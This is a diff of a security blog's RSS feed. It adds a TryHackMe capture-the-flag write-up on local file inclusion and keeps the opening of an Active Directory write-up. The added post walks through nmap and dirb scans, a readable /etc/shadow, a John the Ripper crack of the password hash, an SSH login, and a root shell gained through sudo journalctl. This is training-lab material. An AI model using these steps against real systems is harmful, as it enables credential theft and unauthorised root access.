@@ -1,4 +1,156 @@
-<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>fr33s0ul</title><description>Cybersecurity, Technology, and CTFs</description><link>http://localhost:2368/</link><image><url>http://localhost:2368/favicon.png</url><title>fr33s0ul</title><link>http://localhost:2368/</link></image><generator>Ghost 3.13</generator><lastBuildDate>Fri, 17 Apr 2020 15:09:04 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>Attacktive Directory | THM write-up</title><description>&lt;p&gt;Hello world! today's challenge is very unique, we will go through the steps to exploit an active directory. The challenge is designed by a user called &lt;strong&gt;Sp00ky&lt;/strong&gt;.&lt;br&gt;in my opinion, anyone who wants to get close to active directory exploitation this is the one for you, the amount of knowledge&lt;/p&gt;</description><link>http://localhost:2368/attacktive-directory-thm-write-up/</link><guid isPermaLink="false">5e998781da86f68ecc6f04ae</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Fri, 17 Apr 2020 14:53:35 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/aD.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/aD.png" alt="Attacktive Directory | THM write-up"&gt;&lt;p&gt;Hello world! today's challenge is very unique, we will go through the steps to exploit an active directory. The challenge is designed by a user called &lt;strong&gt;Sp00ky&lt;/strong&gt;.&lt;br&gt;in my opinion, anyone who wants to get close to active directory exploitation this is the one for you, the amount of knowledge you'll learn is just amazing, because Active directories use different protocols. You'll learn a lot about Kerberos and how to crack their hashes, and how to use Impacket Secretsdump to dump Domain-Control hashes, and how to access the machine with only NTLM hash with Evil-WinRM ...&lt;/p&gt;&lt;blockquote&gt;Enumeration&lt;/blockquote&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -p- -A -nP 10.10.203.152
+<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>fr33s0ul</title><description>Cybersecurity, Technology, and CTFs</description><link>http://localhost:2368/</link><image><url>http://localhost:2368/favicon.png</url><title>fr33s0ul</title><link>http://localhost:2368/</link></image><generator>Ghost 3.13</generator><lastBuildDate>Fri, 17 Apr 2020 19:52:38 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>Local file inclusion | write-up</title><description>&lt;p&gt;Hello everyone, here's a quick write-up about LFI that I really recommend for people just starting in the field. It's created by a user called &lt;a href="https://tryhackme.com/p/falconfeast"&gt;&lt;strong&gt;falconfeast&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; &lt;/strong&gt;feel free to visit his room.&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://tryhackme.com"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;TryHackMe | Hacking Training&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;An online platform for learning and teaching cyber security, all through your browser.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png"&gt;&lt;span class="kg-bookmark-publisher"&gt;TryHackMe&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://tryhackme.com/img/favicon.png"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;blockquote&gt;Enumeration&lt;/blockquote&gt;</description><link>http://localhost:2368/lfi/</link><guid isPermaLink="false">5e99fe71da86f68ecc6f05e7</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Fri, 17 Apr 2020 19:48:26 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/653aa50b92574882f.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/653aa50b92574882f.png" alt="Local file inclusion | write-up"&gt;&lt;p&gt;Hello everyone, here's a quick write-up about LFI that I really recommend for people just starting in the field. It's created by a user called &lt;a href="https://tryhackme.com/p/falconfeast"&gt;&lt;strong&gt;falconfeast&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; &lt;/strong&gt;feel free to visit his room.&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://tryhackme.com"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;TryHackMe | Hacking Training&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;An online platform for learning and teaching cyber security, all through your browser.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt="Local file inclusion | write-up"&gt;&lt;span class="kg-bookmark-publisher"&gt;TryHackMe&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://tryhackme.com/img/favicon.png" alt="Local file inclusion | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;blockquote&gt;Enumeration &lt;/blockquote&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.104.39
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-17 19:00 UTC
+Nmap scan report for ip-10-10-104-39.eu-west-1.compute.internal (10.10.104.39)
+Host is up (0.00079s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a8:b9:f0:d3:e4:b3:17:9c:7f:b6:7d:28:72:8a:e4:77 (RSA)
+|   256 07:f2:d9:85:77:74:52:2a:73:76:70:35:73:70:c3:9e (ECDSA)
+|_  256 23:ba:e8:b6:8b:a2:ac:58:3b:f4:04:dc:6e:36:b7:f2 (ED25519)
+80/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.6.9)
+|_http-title: Shop
+MAC Address: 02:24:A4:61:CD:74 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.74 seconds
+root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# dirb http://10.10.104.39
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Apr 17 19:23:58 2020
+URL_BASE: http://10.10.104.39/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.104.39/ ----
++ http://10.10.104.39/home (CODE:200|SIZE:4116)                                    
+                                                                                   
+-----------------
+END_TIME: Fri Apr 17 19:25:08 2020
+DOWNLOADED: 4612 - FOUND: 1
+root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-17-at-20.08.52.png" class="kg-image" alt="Local file inclusion | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-17-at-20.42.18.png" class="kg-image" alt="Local file inclusion | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-17-at-20.10.15.png" class="kg-image" alt="Local file inclusion | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/sc.png" class="kg-image" alt="Local file inclusion | write-up"&gt;&lt;/figure&gt;&lt;p&gt;I next tried to see if the user falcon have access to &lt;strong&gt;/etc/shadow &lt;/strong&gt;and yes ... &lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/rlL4XHR60GPew" width="480" height="341" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/transparent-rlL4XHR60GPew"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;!--kg-card-end: html--&gt;&lt;p&gt;Let's decrypt the hash and see if we have any luck on this one&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# john hash --wordlist=/usr/share/wordlists/rockyou.txt 
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+xxxxxxxxxx       (falcon)
+1g 0:00:00:07 DONE (2020-04-17 19:23) 0.1254g/s 2376p/s 2376c/s 2376C/s soldado..playas
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# ssh falcon@10.10.104.39
+The authenticity of host '10.10.104.39 (10.10.104.39)' can't be established.
+ECDSA key fingerprint is SHA256:K4V/ri6osqzorAUTBrYc1jiyx8Uiy22Uf1qqH6O4Iho.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes            
+Warning: Permanently added '10.10.104.39' (ECDSA) to the list of known hosts.       
+falcon@10.10.104.39's password:                                                     
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)                  
+                                                                                    
+ * Documentation:  https://help.ubuntu.com                                          
+ * Management:     https://landscape.canonical.com                                  
+ * Support:        https://ubuntu.com/advantage                                     
+                                                                                    
+  System information as of Sat Apr 18 00:54:49 IST 2020                             
+                                                                                    
+  System load:  0.72              Processes:           84                           
+  Usage of /:   31.4% of 9.78GB   Users logged in:     0                            
+  Memory usage: 16%               IP address for eth0: 10.10.104.39                 
+  Swap usage:   0%                                                                  
+                                                                                    
+                                                                                    
+6 packages can be updated.                                                          
+3 updates are security updates.                                                     
+                                                                                    
+                                                                                    
+Last login: Wed Jan 29 20:13:44 2020 from 192.168.1.107                             
+falcon@walk:~$                                                                      
+              &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and we are user falcon, I'm pretty sure that there's another way in so feel free to dive in.&lt;/p&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;falcon@walk:~$ ls                                                                   
+user.txt                                                                            
+falcon@walk:~$ cat user.txt                                                         
+XXXXXXXXXXXXXXXXXXXX                                                                
+falcon@walk:~$ sudo -l
+Matching Defaults entries for falcon on walk:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User falcon may run the following commands on walk:
+    (root) NOPASSWD: /bin/journalctl
+falcon@walk:~$&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;The user can use /bin/journalctl as root without password.&lt;/figcaption&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;falcon@walk:~$ sudo /bin/journalctl 
+-- Logs begin at Tue 2020-01-28 19:00:21 IST, end at Sat 2020-04-18 00:58:39 IST. --
+Jan 28 19:00:21 walk kernel: Linux version 4.15.0-20-generic (buildd@lgw01-amd64-039
+Jan 28 19:00:21 walk kernel: Command line: BOOT_IMAGE=/boot/vmlinuz-4.15.0-20-generi
+Jan 28 19:00:21 walk kernel: KERNEL supported cpus:
+Jan 28 19:00:21 walk kernel:   Intel GenuineIntel
+Jan 28 19:00:21 walk kernel:   AMD AuthenticAMD
+Jan 28 19:00:21 walk kernel:   Centaur CentaurHauls
+Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating 
+Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers
+Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers
+Jan 28 19:00:21 walk kernel: x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
+Jan 28 19:00:21 walk kernel: x86/fpu: Enabled xstate features 0x7, context size is 8
+Jan 28 19:00:21 walk kernel: e820: BIOS-provided physical RAM map:
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] 
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] 
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] 
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x0000000000100000-0x000000003ffeffff] 
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x000000003fff0000-0x000000003fffffff] 
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x00000000fec00000-0x00000000fec00fff] 
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x00000000fee00000-0x00000000fee00fff] 
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] 
+Jan 28 19:00:21 walk kernel: NX (Execute Disable) protection: active
+Jan 28 19:00:21 walk kernel: random: fast init done
+Jan 28 19:00:21 walk kernel: SMBIOS 2.5 present.
+Jan 28 19:00:21 walk kernel: DMI: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBo
+Jan 28 19:00:21 walk kernel: Hypervisor detected: KVM
+Jan 28 19:00:21 walk kernel: e820: update [mem 0x00000000-0x00000fff] usable ==&amp;gt; res
+Jan 28 19:00:21 walk kernel: e820: remove [mem 0x000a0000-0x000fffff] usable
+Jan 28 19:00:21 walk kernel: e820: last_pfn = 0x3fff0 max_arch_pfn = 0x400000000
+Jan 28 19:00:21 walk kernel: MTRR default type: uncachable
+Jan 28 19:00:21 walk kernel: MTRR variable ranges disabled:
+Jan 28 19:00:21 walk kernel: MTRR: Disabled
+Jan 28 19:00:21 walk kernel: x86/PAT: MTRRs disabled, skipping PAT initialization to
+Jan 28 19:00:21 walk kernel: CPU MTRRs all blank - virtualized system.
+Jan 28 19:00:21 walk kernel: x86/PAT: Configuration [0-7]: WB  WT  UC- UC  WB  WT  U
+Jan 28 19:00:21 walk kernel: found SMP MP-table at [mem 0x0009fff0-0x0009ffff] mappe
+Jan 28 19:00:21 walk kernel: Scanning 1 areas for low memory corruption
+Jan 28 19:00:21 walk kernel: Base memory trampoline at [        (ptrval)] 99000 size
+Jan 28 19:00:21 walk kernel: BRK [0x2493e000, 0x2493efff] PGTABLE
+Jan 28 19:00:21 walk kernel: BRK [0x2493f000, 0x2493ffff] PGTABLE
+Jan 28 19:00:21 walk kernel: BRK [0x24940000, 0x24940fff] PGTABLE
+Jan 28 19:00:21 walk kernel: BRK [0x24941000, 0x24941fff] PGTABLE
+Jan 28 19:00:21 walk kernel: BRK [0x24942000, 0x24942fff] PGTABLE
+Jan 28 19:00:21 walk kernel: RAMDISK: [mem 0x31777000-0x34bb2fff]
+Jan 28 19:00:21 walk kernel: ACPI: Early table checksum verification disabled
+Jan 28 19:00:21 walk kernel: ACPI: RSDP 0x00000000000E0000 000024 (v02 VBOX  )
+Jan 28 19:00:21 walk kernel: ACPI: XSDT 0x000000003FFF0030 00003C (v01 VBOX   VBOXXS
+Jan 28 19:00:21 walk kernel: ACPI: FACP 0x000000003FFF00F0 0000F4 (v04 VBOX   VBOXFA
+!/bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# ls -la /root
+total 32
+drwx------  5 root root 4096 Jan 30 21:41 .
+drwxr-xr-x 23 root root 4096 Jan 28 19:29 ..
+lrwxrwxrwx  1 root root    9 Jan 30 21:41 .bash_history -&amp;gt; /dev/null
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  3 root root 4096 Jan 28 23:21 .cache
+drwx------  3 root root 4096 Jan 28 19:14 .gnupg
+drwxr-xr-x  3 root root 4096 Jan 28 23:11 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   21 Jan 29 19:52 root.txt
+# 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and we are root ! Enjoy your flags.&lt;/p&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;</content:encoded></item><item><title>Attacktive Directory | THM write-up</title><description>&lt;p&gt;Hello world! today's challenge is very unique, we will go through the steps to exploit an active directory. The challenge is designed by a user called &lt;strong&gt;Sp00ky&lt;/strong&gt;.&lt;br&gt;in my opinion, anyone who wants to get close to active directory exploitation this is the one for you, the amount of knowledge&lt;/p&gt;</description><link>http://localhost:2368/attacktive-directory-thm-write-up/</link><guid isPermaLink="false">5e998781da86f68ecc6f04ae</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Fri, 17 Apr 2020 14:53:35 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/aD.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/aD.png" alt="Attacktive Directory | THM write-up"&gt;&lt;p&gt;Hello world! today's challenge is very unique, we will go through the steps to exploit an active directory. The challenge is designed by a user called &lt;strong&gt;Sp00ky&lt;/strong&gt;.&lt;br&gt;in my opinion, anyone who wants to get close to active directory exploitation this is the one for you, the amount of knowledge you'll learn is just amazing, because Active directories use different protocols. You'll learn a lot about Kerberos and how to crack their hashes, and how to use Impacket Secretsdump to dump Domain-Control hashes, and how to access the machine with only NTLM hash with Evil-WinRM ...&lt;/p&gt;&lt;blockquote&gt;Enumeration&lt;/blockquote&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -p- -A -nP 10.10.203.152
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-17 10:37 UTC
 Nmap scan report for 10.10.203.152
 Host is up (0.00043s latency).
